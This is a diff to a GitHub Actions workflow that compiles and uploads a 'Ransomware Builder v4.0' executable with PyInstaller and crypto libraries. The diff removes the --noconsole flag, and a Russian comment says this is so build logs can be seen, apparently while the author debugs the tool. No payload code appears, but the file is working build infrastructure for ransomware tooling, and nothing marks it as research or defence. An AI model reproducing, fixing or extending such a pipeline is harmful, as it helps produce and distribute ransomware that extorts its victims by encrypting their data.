@@ -1,4 +1,4 @@
-name: Build Ransomware Builder v4.0
+name: Build Ransomware Builder v4.0 (with console)
 
 on:
   push:
@@ -22,10 +22,10 @@ jobs:
       run: |
         pip install pyinstaller pycryptodome pillow
         
-    - name: Build Builder with ALL dependencies embedded
+    - name: Build Builder with ALL dependencies embedded (CONSOLE VERSION)
       run: |
-        # СОБИРАЕМ БИЛДЕР СО ВСЕМИ БИБЛИОТЕКАМИ
-        pyinstaller --onefile --noconsole --name "RansomwareBuilder_v4" `
+        # УБИРАЕМ --noconsole, ЧТОБЫ ВИДЕТЬ ЛОГИ!
+        pyinstaller --onefile --name "RansomwareBuilder_v4_console" `
           --hidden-import PyInstaller `
           --hidden-import Crypto `
           --hidden-import Crypto.Cipher `
@@ -38,5 +38,5 @@ jobs:
     - name: Upload Builder EXE
       uses: actions/upload-artifact@v4
       with:
-        name: RansomwareBuilder_v4
-        path: dist/RansomwareBuilder_v4.exe
+        name: RansomwareBuilder_v4_console
+        path: dist/RansomwareBuilder_v4_console.exe
